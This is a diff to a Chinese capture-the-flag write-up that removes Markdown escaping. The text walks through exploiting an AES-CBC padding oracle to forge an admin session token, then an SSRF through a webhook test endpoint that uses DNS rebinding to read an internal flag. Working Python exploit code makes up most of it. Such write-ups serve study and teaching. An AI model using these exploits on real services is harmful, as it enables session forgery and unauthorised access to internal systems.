@@ -37,7 +37,7 @@ HTML 注释提示存在 "filter parsing" 问题，暗示可能存在过滤/解�
 
 -   提交合法 session → 200 OK 并返回解密后的内容
 
-结合从后续泄露的 session\_clue（或直接推测）——**"Sessions are AES-CBC with a server-fixed IV."**——可以确定这是一个经典的 **AES-CBC 填充预言机 (Padding Oracle)**。
+结合从后续泄露的 session_clue（或直接推测）——**"Sessions are AES-CBC with a server-fixed IV."**——可以确定这是一个经典的 **AES-CBC 填充预言机 (Padding Oracle)**。
 
 ### 2. Padding Oracle 原理解析
 
@@ -51,9 +51,9 @@ CBC 填充预言机的核心在于：服务器用**不同的响应**来区分"�
 
 具体求解公式：
 
-D(C\_last) = 暴力枚举 C\_last-1 变体，找到使填充有效的值
+D(C_last) = 暴力枚举 C_last-1 变体，找到使填充有效的值
 
-P\_last = D(C\_last) XOR original\_C\_last-1
+P_last = D(C_last) XOR original_C_last-1
 
 ### 3. 利用 Padding Oracle 伪造 Admin Token
 
@@ -65,7 +65,7 @@ P2 = {"user":"oracle" (16 bytes)
 
 P3 = ,"role":"admin"} (16 bytes)
 
-P4 = PKCS7 padding \\x10\*16
+P4 = PKCS7 padding \\x10*16
 
 采用从后往前的构造方式（CBC 特性：修改 Ci-1 可以控制 Pi）：
 
@@ -89,13 +89,13 @@ def oracle(blob: bytes) -&gt; bool:
 
 """返回 True 表示填充有效，False 表示填充无效"""
 
-token = b64u\_enc(blob)
+token = b64u_enc(blob)
 
 r = requests.post(f"{BASE}/api/session/decrypt", json={"token": token})
 
-return r.status\_code != 400
+return r.status_code != 400
 
-def discover\_D(C: bytes) -&gt; bytes:
+def discover_D(C: bytes) -&gt; bytes:
 
 """通过 padding oracle 解出中间值 D(C)"""
 
@@ -111,53 +111,53 @@ forged = bytearray(BS)
 
 for j in range(idx + 1, BS):
 
-forged\[j\] = D\[j\] \^ pad
+forged[j] = D[j] \^ pad
 
-forged\[idx\] = guess
+forged[idx] = guess
 
 if oracle(bytes(forged) + C):
 
-\# 消除误报：pad=1 时需要二次验证
+# 消除误报：pad=1 时需要二次验证
 
 if pad == 1 and idx &gt; 0:
 
 test = bytearray(forged)
 
-test\[idx - 1\] \^= 1
+test[idx - 1] \^= 1
 
 if not oracle(bytes(test) + C):
 
 continue
 
-D\[idx\] = guess \^ pad
+D[idx] = guess \^ pad
 
 break
 
 return bytes(D)
 
-\# 从后往前构造
+# 从后往前构造
 
 P2 = b'{"user":"oracle"'
 
 P3 = b',"role":"admin"}'
 
-P4 = bytes(\[16\]) \* 16
+P4 = bytes([16]) * 16
 
 C4 = os.urandom(BS)
 
-D4 = discover\_D(C4)
+D4 = discover_D(C4)
 
-C3 = bytes(D4\[i\] \^ P4\[i\] for i in range(BS))
+C3 = bytes(D4[i] \^ P4[i] for i in range(BS))
 
-D3 = discover\_D(C3)
+D3 = discover_D(C3)
 
-C2 = bytes(D3\[i\] \^ P3\[i\] for i in range(BS))
+C2 = bytes(D3[i] \^ P3[i] for i in range(BS))
 
-D2 = discover\_D(C2)
+D2 = discover_D(C2)
 
-C1 = bytes(D2\[i\] \^ P2\[i\] for i in range(BS))
+C1 = bytes(D2[i] \^ P2[i] for i in range(BS))
 
-admin\_token = b64u\_enc(C1 + C2 + C3 + C4)
+admin_token = b64u_enc(C1 + C2 + C3 + C4)
 
 运行后获得 admin token，携带该 token 访问 /api/profile：
 
@@ -165,13 +165,13 @@ admin\_token = b64u\_enc(C1 + C2 + C3 + C4)
 
 "email": "oracle@oracle.local",
 
-"internal\_endpoint": "http://internal-api:6000/cache/template",
+"internal_endpoint": "http://internal-api:6000/cache/template",
 
-"internal\_token": "0ce471fa7d5f430dcfd6318ce20e3558",
+"internal_token": "0ce471fa7d5f430dcfd6318ce20e3558",
 
 "role": "admin",
 
-"session\_clue": "Sessions are AES-CBC with a server-fixed IV.",
+"session_clue": "Sessions are AES-CBC with a server-fixed IV.",
 
 "uid": "oracle"
 
@@ -193,7 +193,7 @@ http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag
 
 7f000001.01010101.rbndr.us 是 rbndr.us 提供的 DNS Rebinding 服务——域名解析会在 127.0.0.1 和 1.1.1.1 之间随机切换，从而绕过 SSRF 的地址检查。
 
-target\_url = "http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag"
+target_url = "http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag"
 
 for attempt in range(1, 25):
 
@@ -203,21 +203,21 @@ f"{BASE}/api/webhook/test",
 
 json={
 
-"url": target\_url,
+"url": target_url,
 
 "method": "GET",
 
-"headers": {"X-Internal-Token": internal\_token},
+"headers": {"X-Internal-Token": internal_token},
 
 },
 
-cookies={"session": admin\_token},
+cookies={"session": admin_token},
 
 )
 
-if r.status\_code == 200 and "ISCC{" in r.text:
+if r.status_code == 200 and "ISCC{" in r.text:
 
-flag = json.loads(r.json()\["body"\])\["content"\]
+flag = json.loads(r.json()["body"])["content"]
 
 print("FLAG:", flag)
 
